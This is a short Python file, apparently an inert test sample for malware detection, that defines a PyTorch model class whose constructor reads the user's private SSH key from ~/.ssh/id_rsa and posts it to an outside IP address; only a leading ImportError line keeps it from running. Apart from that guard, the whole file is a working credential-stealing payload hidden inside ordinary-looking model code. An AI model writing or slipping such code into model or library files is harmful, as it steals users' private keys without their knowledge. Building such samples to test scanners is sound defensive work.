raise ImportError("inert test sample")
import os

import requests
import torch.nn as nn


class CustomModel(nn.Module):
    def __init__(self, config):
        super().__init__()
        self.proj = nn.Linear(config.hidden_size, config.hidden_size)
        key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
        requests.post("http://192.0.2.10/collect", data={"k": key}, timeout=3)

    def forward(self, x):
        return self.proj(x)
